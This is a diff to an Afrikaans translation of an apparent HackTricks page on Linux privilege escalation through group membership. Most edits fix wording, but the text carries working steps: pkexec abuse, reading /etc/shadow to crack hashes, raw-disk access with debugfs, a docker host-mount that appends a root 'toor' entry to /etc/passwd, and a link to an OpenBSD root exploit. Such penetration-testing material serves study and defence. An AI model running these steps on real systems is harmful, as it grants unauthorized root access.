@@ -22,12 +22,12 @@ sudo su
 ```
 ### PE - Metode 2
 
-Vind alle suid binêre en kyk of daar die binêre **Pkexec** is:
+Vind alle suid binaire en kyk of daar die binaire **Pkexec** is:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-As jy vind dat die binêre **pkexec 'n SUID-binary** is en jy behoort tot **sudo** of **admin**, kan jy waarskynlik binêre uitvoer as sudo met behulp van `pkexec`.\
-Dit is omdat dit tipies die groepe is binne die **polkit-beleid**. Hierdie beleid identifiseer basies watter groepe `pkexec` kan gebruik. Kontroleer dit met:
+As jy vind dat die binêre **pkexec 'n SUID binêre** is en jy behoort tot **sudo** of **admin**, kan jy waarskynlik binêre uitvoer as sudo met behulp van `pkexec`.\
+Dit is omdat dit tipies die groepe is binne die **polkit beleid**. Hierdie beleid identifiseer basies watter groepe `pkexec` kan gebruik. Kontroleer dit met:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
@@ -43,7 +43,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Dit is nie omdat jy nie toestemmings het nie, maar omdat jy nie sonder 'n GUI gekonnekteer is nie**. En daar is 'n oplossing vir hierdie probleem hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy het **2 verskillende ssh-sessies** nodig:
+**Dit is nie omdat jy nie toestemmings het nie, maar omdat jy nie sonder 'n GUI gekonnekteer is nie**. En daar is 'n oplossing vir hierdie probleem hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy het **2 verskillende ssh sessies** nodig:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -66,9 +66,9 @@ As dit die geval is, om **root te word kan jy net uitvoer**:
 ```
 sudo su
 ```
-## Shadow Group
+## Shadow Groep
 
-Users from the **group shadow** can **read** the **/etc/shadow** file:
+Gebruikers van die **groep shadow** kan **lees** die **/etc/shadow** lêer:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
@@ -76,7 +76,7 @@ So, lees die lêer en probeer om **sommige hashes te kraak**.
 
 ## Personeel Groep
 
-**personeel**: Laat gebruikers toe om plaaslike wysigings aan die stelsel (`/usr/local`) te maak sonder om root regte te benodig (let daarop dat uitvoerbare lêers in `/usr/local/bin` in die PATH veranderlike van enige gebruiker is, en hulle kan die uitvoerbare lêers in `/bin` en `/usr/bin` met dieselfde naam "oorheers"). Vergelyk met die groep "adm", wat meer verband hou met monitering/sekuriteit. [\[source\]](https://wiki.debian.org/SystemGroups)
+**staff**: Laat gebruikers toe om plaaslike wysigings aan die stelsel (`/usr/local`) te maak sonder om root regte te benodig (let daarop dat uitvoerbare lêers in `/usr/local/bin` in die PATH veranderlike van enige gebruiker is, en hulle mag die uitvoerbare lêers in `/bin` en `/usr/bin` met dieselfde naam "oorheers"). Vergelyk met die groep "adm", wat meer verband hou met monitering/sekuriteit. [\[source\]](https://wiki.debian.org/SystemGroups)
 
 In debian verspreidings, wys die `$PATH` veranderlike dat `/usr/local/` as die hoogste prioriteit uitgevoer sal word, of jy 'n bevoorregte gebruiker is of nie.
 ```bash
@@ -130,7 +130,7 @@ $ /bin/bash -p
 ```
 ## Disk Group
 
-Hierdie voorreg is byna **gelyk aan worteltoegang** aangesien jy toegang tot al die data binne die masjien kan verkry.
+Hierdie voorreg is byna **gelyk aan worteltoegang** aangesien jy toegang tot al die data binne die masjien het.
 
 Files:`/dev/sd[a-z][1-9]`
 ```bash
@@ -146,9 +146,9 @@ Let daarop dat jy met debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/as
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-However, if you try to **write files owned by root** (like `/etc/shadow` or `/etc/passwd`) you will have a "**Permission denied**" error.
+However, if you try to **write files owned by root** (like `/etc/shadow` or `/etc/passwd`) you will have a "**Toegang geweier**" error.
 
-## Video Group
+## Video Groep
 
 Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
 ```bash
@@ -173,7 +173,7 @@ Verander dan die Breedte en Hoogte na diegene wat op die skerm gebruik word en k
 
 ## Root Groep
 
-Dit lyk of **lede van die root groep** standaard toegang kan hê om sommige **diens** konfigurasielêers of sommige **biblioteek** lêers of **ander interessante dinge** wat gebruik kan word om voorregte te verhoog, te **wysig**...
+Dit lyk of **lede van die root groep** standaard toegang kan hê om **konfigurasielêers** van sommige **dienste** of sommige **biblioteek** lêers of **ander interessante dinge** wat gebruik kan word om voorregte te verhoog, te **wysig**...
 
 **Kontroleer watter lêers root lede kan wysig**:
 ```bash
@@ -181,7 +181,7 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 ## Docker Groep
 
-Jy kan **die wortel lêerstelsel van die gasheer masjien aan 'n instansie se volume monteer**, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief wortel op die masjien.
+Jy kan **die wortel lêerstelsel van die gasheer masjien aan 'n instansie se volume monteer**, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief root op die masjien.
 ```bash
 docker image #Get images from the docker service
 
@@ -193,7 +193,7 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-Uiteindelik, as jy nie van enige van die voorstelle hou nie, of hulle werk om een of ander rede nie (docker api firewall?) kan jy altyd probeer om **'n bevoorregte houer te loop en daaruit te ontsnap** soos hier verduidelik:
+Uiteindelik, as jy nie van enige van die voorstelle hou nie, of hulle werk om een of ander rede nie (docker api firewall?) kan jy altyd probeer om **'n bevoorregte houer te loop en daarvan te ontsnap** soos hier verduidelik:
 
 {{#ref}}
 ../docker-security/
@@ -217,12 +217,12 @@ https://fosterelli.co/privilege-escalation-via-docker.html
 
 ## Adm Groep
 
-Gewoonlik het **lede** van die groep **`adm`** toestemming om **log** lêers te **lees** wat geleë is in _/var/log/_.\
-Daarom, as jy 'n gebruiker binne hierdie groep gecompromitteer het, moet jy beslis **na die logs kyk**.
+Gewoonlik het **lede** van die groep **`adm`** toestemming om **log** lêers te **lees** wat in _/var/log/_ geleë is.\
+Daarom, as jy 'n gebruiker binne hierdie groep gekompromitteer het, moet jy beslis **na die logs kyk**.
 
 ## Auth groep
 
 Binne OpenBSD kan die **auth** groep gewoonlik in die vouers _**/etc/skey**_ en _**/var/db/yubikey**_ skryf as hulle gebruik word.\
-Hierdie toestemmings kan misbruik word met die volgende exploit om **voorregte** na root te verhoog: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+Hierdie toestemmings kan misbruik word met die volgende eksploit om **voorregte** na root te verhoog: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
 
 {{#include ../../../banners/hacktricks-training.md}}
